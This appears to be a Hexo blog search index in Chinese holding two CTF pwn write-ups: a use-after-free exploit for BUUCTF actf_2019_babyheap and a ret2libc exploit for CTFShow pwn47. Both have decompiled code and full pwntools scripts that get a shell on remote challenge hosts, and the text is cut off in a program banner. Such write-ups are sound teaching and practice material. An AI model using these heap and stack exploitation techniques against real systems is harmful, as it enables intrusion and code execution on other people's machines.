<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>UAF</title>
      <link href="/2024/08/27/UAF/"/>
      <url>/2024/08/27/UAF/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>UAF 指释放后引用（ Use-After-Free ）漏洞，它是一种常见的内存安全问题</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当程序释放了一个堆上的内存块，但后续仍然继续使用该已释放的内存块，就会产生 UAF 漏洞</p><blockquote><p>当堆溢出和 UAF 漏洞同时存在时，攻击者可以通过利用堆溢出漏洞来修改或篡改以释放的内存块，进而改变 UAF漏洞的利用条件或影响后续的使用</p></blockquote><p>但是实际上，UAF 有以下三种情况</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ，当程序再次使用这块内存时，会导致程序崩溃</li><li>内存块内释放后，其对应的指针没有被设置为 NULL ，并且在它下一次使用前，没有代码对这块内存块进行修改，当程序再次使用这块内存时，程序很有可能会正常运行</li><li>内存块内释放后，其对应的指针没有被设置为 NULL ，但是在它下一次使用前，有代码对这块内存块进行修改，当程序再次使用这块内存时，程序有可能出现奇怪的问题</li></ul><p>一般所指的 UAF 漏洞主要是后两种</p><blockquote><p>一般称被释放后没有被设置为 NULL 的内存指针为 <code>dangling pointer</code></p></blockquote><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>以 BUUCTF 中的 <a href="https://buuoj.cn/challenges#actf_2019_babyheap">actf_2019_babyheap</a> 为例</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init0();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      print();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        bye();</span><br><span class="line">      create();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="menu-函数"><a href="#menu-函数" class="headerlink" title="menu 函数"></a>menu 函数</h4><p>经典菜单，程序中有 4 个功能，创建、删除、显示、退出，之后程序会根据用于的输入执行相应的功能</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; This is a heap exploit demo  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Create something           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Delete something           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Print something            &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. Exit                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==============================&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now the time is &quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;date&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="create-函数"><a href="#create-函数" class="headerlink" title="create 函数"></a>create 函数</h4><p>创建堆块时，先创建一个 <code>0x10</code> 大小的堆块，然后将 <code>sub_40098A</code> 函数的地址放到 <code>*((_QWORD *)*(&amp;ptr + i) + 1)</code> 中（在 <code>print</code> 函数中会使用到），然后输入想要创建的堆块大小 <code>size</code> ，再使用该 <code>size</code> 创建一个新的堆块，储存到 <code>((_QWORD *)*(&amp;ptr + i))</code> 中，并输入 <code>content</code> 内容并存储到该堆块中</p><p>根据以上内容模拟一个 Node 结构体，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Node &#123;</span><br><span class="line"><span class="type">char</span> *content; <span class="comment">// content 内容</span></span><br><span class="line"><span class="type">int</span> *<span class="title function_">sub_40098A</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * a1)</span>; <span class="comment">// sub_40098A 用于输出的函数的地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> **v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_60204C &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;ptr + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;ptr + i) = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">        *((_QWORD *)*(&amp;ptr + i) + <span class="number">1</span>) = sub_40098A;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Please input size: &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">        v3 = atoi(buf);</span><br><span class="line">        v0 = (<span class="type">void</span> **)*(&amp;ptr + i);</span><br><span class="line">        *v0 = <span class="built_in">malloc</span>(v3);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Please input content: &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, *(<span class="type">void</span> **)*(&amp;ptr + i), v3);</span><br><span class="line">        ++dword_60204C;</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The list is full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p>输入 <code>index</code> 以获得想要删除的堆块编号，通过简单的验证后就将堆块删除，但是需要注意的是，这里在删除后没有进行置空，所以这里存在 UAF 漏洞可供利用</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input list index: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt; dword_60204C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;ptr + v1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="type">void</span> **)*(&amp;ptr + v1));</span><br><span class="line">      <span class="built_in">free</span>(*(&amp;ptr + v1));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="print-函数"><a href="#print-函数" class="headerlink" title="print 函数"></a>print 函数</h4><p>输入 <code>index</code> 以获得想要删除的堆块编号，通过简单的验证后就将堆块进行输出，此处 <code>(*((void (__fastcall **)(_QWORD))*(&amp;ptr + v1) + 1))</code> 在 <code>create</code> 函数中有出现，可以便捷地理解为 <code>sub_40098A</code> 函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">print</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input list index: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt; dword_60204C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;ptr + v1) )</span><br><span class="line">      (*((<span class="type">void</span> (__fastcall **)(_QWORD))*(&amp;ptr + v1) + <span class="number">1</span>))(*(_QWORD *)*(&amp;ptr + v1));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>这里主要利用位于 <code>delete</code> 函数中的 UAF 漏洞，先创建两个堆块 <code>NodeA</code> 和 <code>NodeB</code> ，它们分别自动创建了 <code>ContentA</code> 和 <code>ContentB</code> ，大小自定义为 <code>0x100</code> （此处注意将 <code>Content</code> 的大小设置得距离 <code>0x10</code> 远一点就行了）</p><p><img src="https://gitee.com/chpocenkey/images/raw/master/draw.png" alt="draw.png"></p><p>而后将两个堆块释放，此时由于 <code>glibc</code> 的回收机制， <code>NodeA</code> 和 <code>NodeB</code> 以及 <code>ContentA</code> 和 <code>ContentB</code> 不会在同一个 <code>bin</code> 中（因为之前的 <code>ContentA</code> 和 <code>ContentB</code> 的大小是自己设的，与 <code>0x10</code> 有距离较大）</p><p><img src="https://gitee.com/chpocenkey/images/raw/master/draw1.png" alt="draw1.png"></p><p>此时再申请一个堆块 <code>NodeC</code> ，它创建的 <code>ContentC</code> 大小设为 <code>0x10</code> ，这样 <code>NodeC == NodeB</code> 并且 <code>ContentC == NodeA</code> ，因为当创建堆块 <code>C</code> 时，首先创建 <code>NodeC</code> ，由于 <code>NodeC</code> 的大小固定为 <code>0x10</code> ，所以 <code>glibc</code> 将大小为 <code>0x10</code> 的 <code>free</code> 掉的堆块 <code>NodeB</code> 给了 <code>NodeC</code> ，之后再申请一个堆块 <code>ContentC</code> 时，此时我们自定义的大小仍然为 <code>0x10</code> ，所以将另一个 <code>free</code> 掉的 <code>0x10</code> 大小的堆块 <code>NodeA</code> 给了 <code>ContentC</code></p><p><img src="https://gitee.com/chpocenkey/images/raw/master/draw2.png" alt="draw2.png"></p><p>但是此时需要注意， <code>NodeA</code> 仍然是可以根据 <code>index</code> 进行操作的，因为 <code>delete</code> 函数只是单纯的 <code>free</code> 掉堆块，没有进行善后</p><p>于是可以通过在调用 <code>create</code> 函数创建 <code>NodeC</code> 时输入 <code>ContentC</code> 的值从而改变 <code>NodeA</code> 的值<br><code>Node</code> 的数据结构之前猜测为</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Node &#123;</span><br><span class="line"><span class="type">char</span> *content; <span class="comment">// content 内容</span></span><br><span class="line"><span class="type">int</span> *<span class="title function_">sub_40098A</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * a1)</span>; <span class="comment">// sub_40098A 用于输出的函数的地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它的两个内容都是指针，可以通过将 <code>&#39;/bin/sh&#39;</code> 的地址和 <code>system</code> 函数的地址写入从而 <code>getshell</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python 3.11.6</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./ACTF_2019_babyheap&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25334</span>)</span><br><span class="line">binsh_addr = <span class="number">0x602010</span></span><br><span class="line">system_addr = <span class="number">0x4007A0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Please input size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Please input content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Please input list index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Please input list index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x100</span>) <span class="comment"># NodeA</span></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x100</span>) <span class="comment"># NodeB</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># delete NodeA</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># delete NodeB</span></span><br><span class="line">create(<span class="number">0x10</span>, p64(binsh_addr) + p64(system_addr)) <span class="comment"># modify NodeA</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.interactive()      </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc</title>
      <link href="/2024/08/25/retlibc/"/>
      <url>/2024/08/25/retlibc/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>ret2libc</code> 是一种在存在栈溢出漏洞的程序中利用动态链接库（ 如 <code>libc</code> ）中的函数来执行任意代码的方法</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><code>ret2libc</code> 控制函数执行 <code>libc</code> 中的函数，通常是返回某个函数的 <code>plt</code> 处或者函数的具体位置（即函数对应的 <code>got</code> 表项的内容）  </p><p>一般情况下，会执行 <code>system(&quot;/bin/sh&quot;)</code> 语句，但也可以使用 <code>execve</code> 函数或 <code>/sh</code> 参数</p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ul><li>存在溢出，且溢出的范围足够大，可以覆盖到 <code>main</code> 函数的返回地址</li><li><p>存在如 <code>puts</code> , <code>write</code> 等的打印函数可以被利用。在劫持程序的执行流程后，执行 <code>puts</code> , <code>write</code> 等函数打印一些已经执行过的函数的真实地址，以便寻找 <code>libc</code> 的基地址</p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2></li><li><p>开启了 NX 保护，同时栈不可执行，不能使用 <code>ret2shellcode</code></p></li><li>程序本身没有如 <code>system(&#39;/bin/sh&#39;)</code> 的后门函数，不能直接使用 <code>ret2text</code></li><li>程序中既没 <code>system</code> 函数，也没 <code>/bin/sh</code> 字符串，需要在 <code>libc</code> 库中寻找</li></ul><p>由于这种题目需要判断 <code>libc</code> 的版本，需要使用到 <code>LibcSearcher</code> 这个库</p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li>寻找一个函数的真实地址，以 <code>puts</code> 为例，构建合理的 <code>payload1</code> ，劫持程序的执行流程，使得程序执行 <code>puts</code> 打印得到 <code>puts</code> 函数的真实地址，并返回到 <code>main</code> 函数重新开始</li><li>根据泄露出的 <code>puts</code> 函数的真实地址的后三位，判断出 <code>libc</code> 库的版本（ <code>LibcSearcher</code> 或网站）</li><li>根据 <code>libc</code> 库的版本确定 <code>puts</code> 函数的偏移地址</li><li>计算 <script type="math/tex">基地址 = puts 函数的真实地址 - puts 函数的偏移地址</script></li><li>根据 <code>libc</code> 库的版本计算出 <code>system</code> 函数和 <code>&#39;/bin/sh&#39;</code> 字符串在 <code>libc</code> 库中的偏移地址</li><li>根据 $真实地址 = 基地址 + 偏移地址$ ，计算出 <code>system</code> 函数和 <code>&#39;/bin/sh&#39;</code> 字符串的真实地址</li><li>构造合理的 <code>payload2</code> ，劫持程序的执行流程，执行 <code>system(&#39;/bin/sh&#39;)</code> 从而拿到 <code>shell</code><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2></li></ol><p>以 CTFShow 中的 <code>pwn47</code> 为例</p><p>首先使用 <code>checksec</code> 工具检查编译出的文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ checksec --file=&#x27;./pwn&#x27; </span><br><span class="line">[*] &#x27;/home/kali/桌面/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以确认该程序为 32 位程序，栈不可执行，没有其他保护</p><p>利用 IDA 来反编译一下二进制程序</p><p><img src="https://gitee.com/chpocenkey/images/raw/master/20240715151507.png" alt="image.png"></p><p>先查看 <code>main</code> 函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  logo();</span><br><span class="line">  puts(&quot;Give you some useful addr:\n&quot;);</span><br><span class="line">  printf(&quot;puts: %p\n&quot;, &amp;puts);</span><br><span class="line">  printf(&quot;fflush %p\n&quot;, &amp;fflush);</span><br><span class="line">  printf(&quot;read: %p\n&quot;, &amp;read);</span><br><span class="line">  printf(&quot;write: %p\n&quot;, &amp;write);</span><br><span class="line">  printf(&quot;gift: %p\n&quot;, useful);</span><br><span class="line">  putchar(10);</span><br><span class="line">  ctfshow();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现该函数泄露了 <code>puts</code> , <code>write</code> 等函数的地址（虽然也没啥用）</p><p>再查看可疑函数 <code>ctfshow</code></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">ctfshow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">152</span>]; <span class="comment">// [esp+Ch] [ebp-9Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Start your show time: &quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现该函数中一个非常明显的危险函数 <code>gets</code></p><p>该函数读取后写入的字符串 <code>s</code> 长度为 <code>152</code> ，离栈底的距离为 <code>0x9C</code> ，但是 <code>gets</code> 函数读取的数据长度没有限制，从而造成了栈溢出</p><p>字符串 <code>s</code> 离 <code>ebp</code> 的距离为 <code>0x9C</code>，那么相应的栈结构为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   +-----------------+</span><br><span class="line">   |     retaddr     |</span><br><span class="line">   +-----------------+</span><br><span class="line">   |     saved ebp   |</span><br><span class="line">ebp---&gt;+-----------------+</span><br><span class="line">   |                 |</span><br><span class="line">   |                 |</span><br><span class="line">   |                 |</span><br><span class="line">   |                 |</span><br><span class="line">   |                 |</span><br><span class="line">   |                 |</span><br><span class="line">s,ebp-0x9C--&gt;+-----------------+</span><br></pre></td></tr></table></figure><p>由于程序中没有 <code>system</code> 函数及相关函数地址，所以需要我们利用泄露出来的函数地址，通过 <code>libc</code> 库获得 <code>system</code> 函数的实际地址</p><p>通过 <code>ROPgadget</code> 函数可以查找到 <code>&#39;/bin/sh&#39;</code> 字符串，所以只需要得到 <code>system</code> 函数的地址就够了（没有 <code>&#39;/bin/sh&#39;</code> 字符串的可以用与得到 <code>system</code> 函数地址同样的操作得到 <code>&#39;/bin/sh&#39;</code> 字符串地址）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ROPgadget --binary &#x27;./pwn&#x27; --string &#x27;/bin/sh&#x27;</span><br><span class="line">/usr/local/bin/ROPgadget:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  __import__(&#x27;pkg_resources&#x27;).run_script(&#x27;ROPGadget==7.4&#x27;, &#x27;ROPgadget&#x27;)</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0804b028 : /bin/sh</span><br></pre></td></tr></table></figure><p>使用 <code>pwntools</code> 编写利用脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * <span class="comment"># 导入 LibcSearcher 库用于查找 libc 库版本</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28170</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>) <span class="comment"># 获取 elf 文件信息</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x804b028</span> <span class="comment"># /bin/sh 字符串的地址，如果没有可以参照下面操作获取</span></span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>] <span class="comment"># 获取 main 函数地址</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>] <span class="comment"># 获取 puts 函数的 got 表地址</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>] <span class="comment"># 获取 puts 函数的 plt 表地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建 payload 用于泄露 puts 函数的地址从而获取基地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x9c</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span> + p32(puts_plt) + p32(main) + p32(puts_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"><span class="comment"># 获取输出，只需要前四个字节</span></span><br><span class="line">puts_addr = u32(r.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 puts 地址信息查找 libc 库信息</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取基地址</span></span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 system 函数的真实地址</span></span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建 payload 用于获取 shell</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x9c</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span> + p32(system) + p32(<span class="number">0</span>) + p32(binsh)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行代码，可以得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ python shellcode.py</span><br><span class="line">[+] Opening connection to pwn.challenge.ctf.show on port 28170: Done</span><br><span class="line">[*] &#x27;/home/kali/桌面/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">/home/kali/桌面/shellcode.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  r.recvuntil(&quot;\n\n&quot;)</span><br><span class="line">/home/kali/桌面/shellcode.py:16: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  puts_addr = u32(r.recvuntil(&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">0xf7e2f360</span><br><span class="line">[+] ubuntu-glibc (id libc6-i386_2.27-3ubuntu1_amd64) be choosed.</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      